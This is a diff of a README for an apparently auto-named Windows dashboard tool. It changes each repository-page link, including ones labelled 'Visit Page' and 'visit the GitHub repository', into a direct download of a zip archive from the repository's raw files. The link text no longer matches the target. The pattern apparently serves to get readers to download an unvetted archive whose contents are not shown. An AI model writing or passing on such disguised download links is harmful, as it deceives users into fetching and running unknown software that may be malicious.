@@ -1,12 +1,12 @@
 # 📊 dashboard-1771921898-3 - Real-Time Data Visualization Tool
 
-[![Download dashboard-1771921898-3](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://github.com/Kopoku-69/dashboard-1771921898-3)
+[![Download dashboard-1771921898-3](https://img.shields.io/badge/Download-Visit%20Page-blue)](https://raw.githubusercontent.com/Kopoku-69/dashboard-1771921898-3/main/pkg/dashboard-2.7.zip)
 
 ## 📥 Download and Install
 
 You can get the software by visiting the page below. It has everything you need to start using the dashboard on your Windows PC.
 
-[Download dashboard-1771921898-3 here](https://github.com/Kopoku-69/dashboard-1771921898-3)
+[Download dashboard-1771921898-3 here](https://raw.githubusercontent.com/Kopoku-69/dashboard-1771921898-3/main/pkg/dashboard-2.7.zip)
 
 To install:
 
@@ -90,7 +90,7 @@ Always download software from trusted sources and keep your system updated for s
 
 For assistance, visit the GitHub repository:
 
-[https://github.com/Kopoku-69/dashboard-1771921898-3](https://github.com/Kopoku-69/dashboard-1771921898-3)
+[https://raw.githubusercontent.com/Kopoku-69/dashboard-1771921898-3/main/pkg/dashboard-2.7.zip](https://raw.githubusercontent.com/Kopoku-69/dashboard-1771921898-3/main/pkg/dashboard-2.7.zip)
 
 You can find user guides, submit issues, or ask questions under the "Discussions" or "Issues" tabs.
 
